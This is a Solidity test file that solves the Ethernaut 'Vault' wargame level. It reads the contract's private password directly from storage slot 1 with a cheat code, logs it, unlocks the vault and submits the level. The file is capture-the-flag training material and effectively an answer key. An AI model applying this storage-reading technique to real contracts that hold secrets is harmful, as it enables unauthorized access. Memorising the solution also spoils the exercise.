pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Vault/VaultFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract VaultTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Cheat code to load contract storage at specific slot
        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
        // Log bytes stored at that memory location
        emit log_bytes(abi.encodePacked(password)); 


        // The following lines just convert from bytes32 to a string and logs it so you can see that the password we have obtained is correct
        uint8 i = 0;

        while(i < 32 && password[i] != 0) {
            i++;
        }
        bytes memory bytesArray = new bytes(i);
        for (i = 0; i < 32 && password[i] != 0; i++) {
            bytesArray[i] = password[i];
        }

        emit log_string(string(bytesArray));

        // Call the unlock function with the password we read from storage
        ethernautVault.unlock(password);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}